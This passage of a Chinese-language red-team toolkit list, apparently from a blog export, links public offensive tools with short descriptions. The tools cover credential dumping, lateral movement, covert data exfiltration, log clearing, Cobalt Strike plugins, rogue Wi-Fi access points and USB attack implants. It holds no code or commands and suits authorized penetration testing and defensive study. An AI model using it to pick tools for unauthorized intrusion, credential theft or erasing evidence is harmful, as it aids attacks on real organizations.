<li><a href="https://github.com/Mr-Un1k0d3r/PowerLessShell">https://github.com/Mr-Un1k0d3r/PowerLessShell</a> PowerLessShell依靠 MSBuild.exe 远程执行 PowerShell 脚本和命令，而无需生成 powershell.exe</li>
<li><a href="https://github.com/GoFetchAD/GoFetch">https://github.com/GoFetchAD/GoFetch</a> GoFetch是一种自动执行由 BloodHound 应用程序生成的攻击计划的工具</li>
<li><a href="https://github.com/vysec/ANGRYPUPPY">https://github.com/vysec/ANGRYPUPPY</a> ANGRYPUPPY CobaltStrike 中的猎犬攻击路径自动化</li>
<li><a href="https://github.com/byt3bl33d3r/DeathStar">https://github.com/byt3bl33d3r/DeathStar</a> DeathStar是一个 Python 脚本，它使用 Empire 的 RESTful API 使用各种技术在 Active Directory 环境中自动获取域管理员权限 ✨</li>
<li><a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a> BloodHound.py是一个基于 Python 的 BloodHound 摄取器，基于 Impacket</li>
<li><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a> Responder是一个 LLMNR、NBT-NS 和 MDNS 中毒器，内置支持 NTLMv1&#x2F;NTLMv2&#x2F;LMv2、扩展安全 NTLMSSP 和基本 HTTP 身份验证的 HTTP&#x2F;SMB&#x2F;MSSQL&#x2F;FTP&#x2F;LDAP 流氓身份验证服务器 ✨</li>
<li><a href="https://github.com/fireeye/SessionGopher">https://github.com/fireeye/SessionGopher</a> SessionGopher是一个 PowerShell 工具，它使用 WMI 为 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft 远程桌面等远程访问工具提取保存的会话信息</li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> PowerSploit是 Microsoft PowerShell 模块的集合，可用于在评估的所有阶段为渗透测试人员提供帮助 ✨</li>
<li><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> Nishang是一个脚本和有效载荷的框架和集合，它支持使用 PowerShell 进行攻击性安全、渗透测试和红队 ✨</li>
<li><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a> Inveigh是 Windows PowerShell LLMNR&#x2F;mDNS&#x2F;NBNS 欺骗者&#x2F;中间人工具</li>
<li><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a> PowerUpSQL一个用于攻击 SQL Server 的 PowerShell 工具包 ✨</li>
<li><a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a> MailSniper是一种渗透测试工具，用于在 Microsoft Exchange 环境中通过电子邮件搜索特定术语（密码、内部信息、网络架构信息等）</li>
<li><a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a> DomainPasswordSpray是一种用 PowerShell 编写的工具，用于对域用户执行密码喷射攻击</li>
<li><a href="https://github.com/ChrisTruncer/WMIOps">https://github.com/ChrisTruncer/WMIOps</a> WMIOps是一个 powershell 脚本，它使用 WMI 在 Windows 环境中的本地或远程主机上执行各种操作</li>
<li><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a> Mimikatz是一个开源实用程序，可用于查看来自 Windows lsass 的凭据信息 ✨</li>
<li><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a> LaZagne项目是一个跨平台开源应用程序，用于检索存储在本地计算机上的大量密码 ✨</li>
<li><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a> mimipenguin是一个转储当前 linux 桌面用户的登录密码的工具 ✨</li>
<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a> PsExec是一种轻量级的 telnet 替代品，可让您在其他系统上执行进程，并与控制台应用程序完全交互，而无需手动安装客户端软件 ✨</li>
<li><a href="https://github.com/HarmJ0y/KeeThief">https://github.com/HarmJ0y/KeeThief</a> KeeThief允许从内存中提取 KeePass 2.X 密钥材料，以及 KeePass 触发系统的后门和枚举</li>
<li><a href="https://github.com/eladshamir/Internal-Monologue">https://github.com/eladshamir/Internal-Monologue</a> 内部独白攻击在不接触 LSASS 的情况下检索 NTLM 哈希</li>
<li><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a> Impacket是一组用于处理网络协议的 Python 类 ✨</li>
<li><a href="https://github.com/DanMcInerney/icebreaker">https://github.com/DanMcInerney/icebreaker</a> 如果您在内部网络上但在 AD 环境之外，icebreaker会获取纯文本 Active Directory 凭据</li>
<li><a href="https://github.com/api0cradle/LOLBAS">https://github.com/api0cradle/LOLBAS</a> 生活在陆地上的二进制文件和脚本（现在还有库）这些列表的目标是记录每个二进制文件、脚本和库，这些二进制文件、脚本和库可用于其他目的，而不是它们的设计目的</li>
<li><a href="https://github.com/AlsidOfficial/WSUSpendu">https://github.com/AlsidOfficial/WSUSpendu</a> WSUSpendu用于受感染的 WSUS 服务器，以将危害扩展到客户端</li>
<li><a href="https://github.com/infobyte/evilgrade">https://github.com/infobyte/evilgrade</a> Evilgrade是一个模块化框架，它允许用户通过注入虚假更新来利用糟糕的升级实现 ✨</li>
<li><a href="https://github.com/NytroRST/NetRipper">https://github.com/NytroRST/NetRipper</a> NetRipper是一个针对 Windows 系统的后期开发工具，它使用 API 挂钩来拦截来自低权限用户的网络流量和加密相关功能，能够在加密之前&#x2F;解密之后捕获纯文本流量和加密流量</li>
<li><a href="https://github.com/codewhitesec/LethalHTA">https://github.com/codewhitesec/LethalHTA</a> 使用 DCOM 和 HTA 的LethalHTA横向运动技术</li>
<li><a href="https://github.com/nettitude/Invoke-PowerThIEf">https://github.com/nettitude/Invoke-PowerThIEf</a> Invoke-PowerThIEf是一个 Internet Explorer 后利用库</li>
<li><a href="https://github.com/nccgroup/redsnarf">https://github.com/nccgroup/redsnarf</a> RedSnarf是一个用于 Windows 环境的渗透测试&#x2F;红队工具</li>
<li><a href="https://github.com/JavelinNetworks/HoneypotBuster">https://github.com/JavelinNetworks/HoneypotBuster</a> HoneypotBuster Microsoft PowerShell 模块专为红队设计，可用于在网络或主机上查找蜜罐和蜜币</li>
<li><a href="https://www.poweradmin.com/paexec/">https://www.poweradmin.com/paexec/</a> PAExec允许您在远程 Windows 计算机上启动 Windows 程序，而无需先在远程计算机上安装软件 ✨</li>
</ul>
<h3 id="5-数据渗漏"><a href="#5-数据渗漏" class="headerlink" title="5. 数据渗漏"></a>5. 数据渗漏</h3><ul>
<li><a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a> CloakifyFactory和 Cloakify 工具集 - 数据渗透和渗透；规避 DLP&#x2F;MLS 设备；分析师的社会工程学；击败数据白名单控制；逃避 AV 检测 ✨</li>
<li><a href="https://github.com/sensepost/DET">https://github.com/sensepost/DET</a> DET（按原样提供）是同时使用单个或多个通道执行数据渗漏的概念证明</li>
<li><a href="https://github.com/Arno0x/DNSExfiltrator">https://github.com/Arno0x/DNSExfiltrator</a> DNSExfiltrator允许通过 DNS 请求隐蔽通道传输（提取）文件</li>
<li><a href="https://github.com/ytisf/PyExfil">https://github.com/ytisf/PyExfil</a> PyExfil一个用于数据泄露的 Python 包 ✨</li>
<li><a href="https://github.com/ChrisTruncer/Egress-Assess">https://github.com/ChrisTruncer/Egress-Assess</a> Egress-Assess是一种用于测试出口数据检测能力的工具</li>
<li><a href="https://github.com/Viralmaniar/Powershell-RAT">https://github.com/Viralmaniar/Powershell-RAT</a> 基于Powershell RAT python 的后门，它使用 Gmail 将数据作为电子邮件附件泄露</li>
</ul>
<h3 id="6-痕迹清除"><a href="#6-痕迹清除" class="headerlink" title="6. 痕迹清除"></a>6. 痕迹清除</h3><ul>
<li><a href="https://github.com/Rizer0/Log-killer">https://github.com/Rizer0/Log-killer</a> linux&#x2F;windows日志清除 ✨</li>
<li><a href="https://github.com/hlldz/Phant0m">https://github.com/hlldz/Phant0m</a>  Windows事件日志清除</li>
</ul>
<h2 id="0x04杂项辅助"><a href="#0x04杂项辅助" class="headerlink" title="0x04	杂项辅助"></a>0x04	杂项辅助</h2><h3 id="1-扩展插件"><a href="#1-扩展插件" class="headerlink" title="1. 扩展插件"></a>1. 扩展插件</h3><ul>
<li><a href="https://github.com/LasCC/Hack-Tools">https://github.com/LasCC/Hack-Tools</a>  Hack-Tools 适用于红队的浏览器扩展插件 ✨</li>
<li><a href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a>  有关burpsuite的插件(非商店),文章以及使用技巧的收集</li>
<li><a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a>  梼杌 cobalt strike3.x与cobalt strike4.x的插件</li>
<li><a href="https://github.com/pmiaowu/BurpShiroPassiveScan">https://github.com/pmiaowu/BurpShiroPassiveScan</a>  一款基于BurpSuite的被动式shiro检测插件</li>
<li><a href="https://github.com/FelisCatus/SwitchyOmega">https://github.com/FelisCatus/SwitchyOmega</a>  SwitchyOmega 浏览器的代理插件 ✨</li>
<li><a href="https://github.com/pmiaowu/BurpFastJsonScan">https://github.com/pmiaowu/BurpFastJsonScan</a>  一款基于BurpSuite的被动式FastJson检测插件</li>
<li><a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a>  HaE 请求高亮标记与信息提取的辅助型 BurpSuite 插件</li>
<li><a href="https://github.com/z1un/Z1-AggressorScripts">https://github.com/z1un/Z1-AggressorScripts</a>  Z1-AggressorScripts 适用于Cobalt Strike 3.x &amp; 4.x 的插件</li>
<li><a href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a>  domain_hunter_pro 一个资产管理类的Burp插件</li>
<li><a href="https://github.com/BishopFox/GadgetProbe">https://github.com/BishopFox/GadgetProbe</a>  GadgetProbe Burp插件 用来爆破远程类查找Java反序列化</li>
<li><a href="https://github.com/filedescriptor/untrusted-types">https://github.com/filedescriptor/untrusted-types</a>  Chrome插件.使用DevTools查找DOM XSS</li>
<li><a href="https://github.com/threatexpress/random_c2_profile">https://github.com/threatexpress/random_c2_profile</a>  Cobalt Strike随机C2配置文件生成器</li>
<li><a href="https://github.com/kingz40o/Aggressor_dingding">https://github.com/kingz40o/Aggressor_dingding</a>  Cobalt Strike 上线提醒</li>
<li><a href="https://github.com/fofapro/fofa_view">https://github.com/fofapro/fofa_view</a>  FOFA Pro view 是一款FOFA Pro 资产展示浏览器插件</li>
</ul>
<h3 id="2-信息收集脚本"><a href="#2-信息收集脚本" class="headerlink" title="2. 信息收集脚本"></a>2. 信息收集脚本</h3><ul>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite">https://github.com/FuzzySecurity/PowerShell-Suite</a></li>
<li><a href="https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts">https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts</a></li>
<li><a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a></li>
<li><a href="https://github.com/SadProcessor/SomeStuff">https://github.com/SadProcessor/SomeStuff</a></li>
<li><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a></li>
<li><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff">https://github.com/enigma0x3/Misc-PowerShell-Stuff</a></li>
<li><a href="https://github.com/ChrisTruncer/PenTestScripts">https://github.com/ChrisTruncer/PenTestScripts</a></li>
<li><a href="https://github.com/bluscreenofjeff/Scripts">https://github.com/bluscreenofjeff/Scripts</a></li>
<li><a href="https://github.com/xorrior/RandomPS-Scripts">https://github.com/xorrior/RandomPS-Scripts</a></li>
<li><a href="https://github.com/xorrior/Random-CSharpTools">https://github.com/xorrior/Random-CSharpTools</a></li>
<li><a href="https://github.com/leechristensen/Random">https://github.com/leechristensen/Random</a></li>
</ul>
<h3 id="3-Aggressor-Scripts"><a href="#3-Aggressor-Scripts" class="headerlink" title="3. Aggressor Scripts"></a>3. Aggressor Scripts</h3><ul>
<li><a href="https://github.com/invokethreatguy/AggressorCollection">https://github.com/invokethreatguy/AggressorCollection</a></li>
<li><a href="https://github.com/secgroundzero/CS-Aggressor-Scripts">https://github.com/secgroundzero/CS-Aggressor-Scripts</a></li>
<li><a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a></li>
<li><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a> ✨</li>
<li><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a></li>
<li><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></li>
<li><a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a> ✨</li>
<li><a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a></li>
<li><a href="https://github.com/360-A-Team/CobaltStrike-Toolset">https://github.com/360-A-Team/CobaltStrike-Toolset</a></li>
<li><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a></li>
<li><a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a></li>
</ul>
<h3 id="4-日志聚合"><a href="#4-日志聚合" class="headerlink" title="4. 日志聚合"></a>4. 日志聚合</h3><ul>
<li><a href="https://github.com/outflanknl/RedELK/">https://github.com/outflanknl/RedELK/</a> RedELK Red Team 的 SIEM - 易于部署的 Red Team 工具，用于跟踪和警告 Blue Team 活动以及更好的长期运营可用性 ✨</li>
<li><a href="https://github.com/vysec/CobaltSplunk">https://github.com/vysec/CobaltSplunk</a> 用于 CobaltStrike 日志的CobaltSplunk Splunk 仪表板</li>
<li><a href="https://github.com/ztgrace/red_team_telemetry">https://github.com/ztgrace/red_team_telemetry</a> 红队遥测一组脚本和配置，用于启用红队基础设施的集中日志记录</li>
<li><a href="https://github.com/SecurityRiskAdvisors/RedTeamSIEM">https://github.com/SecurityRiskAdvisors/RedTeamSIEM</a> Elastic for Red Teaming使用 Elastic 配置 Red Team SIEM 的资源存储库</li>
<li><a href="https://github.com/GhostManager/Ghostwriter">https://github.com/GhostManager/Ghostwriter</a> Ghostwriter是一个用 Python 3.7 编写的 Django 项目，旨在供一组操作员使用</li>
</ul>
<h3 id="5-对抗模拟"><a href="#5-对抗模拟" class="headerlink" title="5. 对抗模拟"></a>5. 对抗模拟</h3><ul>
<li><a href="https://github.com/mitre/caldera">https://github.com/mitre/caldera</a> MITRE CALDERA - 一种自动对手仿真系统，可在 Windows 企业网络中执行妥协后的对抗行为 ✨</li>
<li><a href="https://github.com/NextronSystems/APTSimulator">https://github.com/NextronSystems/APTSimulator</a> APTSimulator - 一个 Windows 批处理脚本，它使用一组工具和输出文件使系统看起来好像受到了威胁 ✨</li>
<li><a href="https://github.com/redcanaryco/atomic-red-team">https://github.com/redcanaryco/atomic-red-team</a> Atomic Red Team - 映射到 Miter ATT&amp;CK 框架的小型且高度便携的检测测试 ✨</li>
<li><a href="https://github.com/alphasoc/flightsim">https://github.com/alphasoc/flightsim</a> Network Flight Simulator -flightsim 是一种轻量级实用程序，用于生成恶意网络流量并帮助安全团队评估安全控制和网络可见性</li>
<li><a href="https://github.com/uber-common/metta">https://github.com/uber-common/metta</a> Metta - 进行对抗性模拟的安全准备工具</li>
<li><a href="https://github.com/endgameinc/RTA">https://github.com/endgameinc/RTA</a> 红队自动化 (RTA) - RTA 提供了一个脚本框架，旨在允许蓝队测试他们对恶意交易的检测能力，模仿 MITRE ATT&amp;CK</li>
</ul>
<h3 id="6-无线网络"><a href="#6-无线网络" class="headerlink" title="6. 无线网络"></a>6. 无线网络</h3><ul>
<li><a href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a> Wifiphisher是一种安全工具，它执行 Wi-Fi 自动关联攻击以强制无线客户端在不知不觉中连接到攻击者控制的接入点 ✨</li>
<li><a href="https://github.com/sensepost/mana">https://github.com/sensepost/mana</a> 用于 wifi 流氓 AP 攻击和中间人的mana工具包</li>
</ul>
<h3 id="7-物理渗透"><a href="#7-物理渗透" class="headerlink" title="7. 物理渗透"></a>7. 物理渗透</h3><ul>
<li><a href="https://github.com/samyk/magspoof">https://github.com/samyk/magspoof</a> magspoof一种便携式设备，可以“无线”欺骗&#x2F;模拟任何磁条、信用卡或酒店卡，即使在标准磁条（非 NFC&#x2F;RFID）阅读器上也是如此 ✨</li>
<li><a href="https://github.com/secgroundzero/warberry">https://github.com/secgroundzero/warberry</a> WarBerryPi 的构建目的是在红队场景中用作硬件植入物，在这种场景中，我们希望在尽可能隐蔽的情况下在短时间内获取尽可能多的信息</li>
<li><a href="https://github.com/mame82/P4wnP1">https://github.com/mame82/P4wnP1</a> P4wnP1是一个高度可定制的 USB 攻击平台，基于低成本的 Raspberry Pi Zero 或 Raspberry Pi Zero W（HID 后门需要） ✨</li>
<li><a href="https://github.com/ebursztein/malusb">https://github.com/ebursztein/malusb</a> 用于Teensy 的malusb HID 欺骗多操作系统有效负载</li>
<li><a href="https://github.com/samyk/poisontap">https://github.com/samyk/poisontap</a> 毒攻通过 USB 利用锁定&#x2F;密码保护的计算机，丢弃基于 WebSocket 的持久后门，暴露内部路由器，并使用 Raspberry Pi Zero 和 Node.js 虹吸 cookie ✨</li>
<li><a href="https://github.com/whid-injector/WHID">https://github.com/whid-injector/WHID</a> WHID WiFi HID 注射器 - 类固醇上的 USB Rubberducky &#x2F; BadUSB ✨</li>
<li><a href="https://github.com/nccgroup/phantap">https://github.com/nccgroup/phantap</a> PhanTap是一种针对红队的“隐形”网络分流器</li>
</ul>
<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul>
<li><a href="https://attack.mitre.org/software/">https://attack.mitre.org/software/</a></li>
<li><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></li>
<li><a href="https://github.com/toolswatch/blackhat-arsenal-tools">https://github.com/toolswatch/blackhat-arsenal-tools</a></li>
<li><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></li>
<li><a href="http://www.osint-labs.org/apt/">http://www.osint-labs.org/apt/</a></li>
<li><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></li>
<li><a href="https://github.com/r0eXpeR/RedTeamAttack">https://github.com/r0eXpeR/RedTeamAttack</a></li>
<li><a href="https://github.com/Al1ex/Red-Team">https://github.com/Al1ex/Red-Team</a></li>
<li><a href="https://websec.readthedocs.io/zh/latest/tools/index.html">https://websec.readthedocs.io/zh/latest/tools/index.html</a></li>
<li><a href="https://github.com/Snowming04/The-Hacker-Playbook-3-Translation">https://github.com/Snowming04/The-Hacker-Playbook-3-Translation</a></li>
<li><a href="https://www.t00ls.net/pytools.html">https://www.t00ls.net/pytools.html</a></li>
<li><a href="https://github.com/alphaSeclab/awesome-rat">https://github.com/alphaSeclab/awesome-rat</a></li>
<li><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></li>
<li><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></li>
</ul>
]]></content>
      <categories>
        <category>红队渗透</category>
      </categories>
      <tags>
        <tag>Tookit</tag>
        <tag>Red Team</tag>
      </tags>
  </entry>
</search>
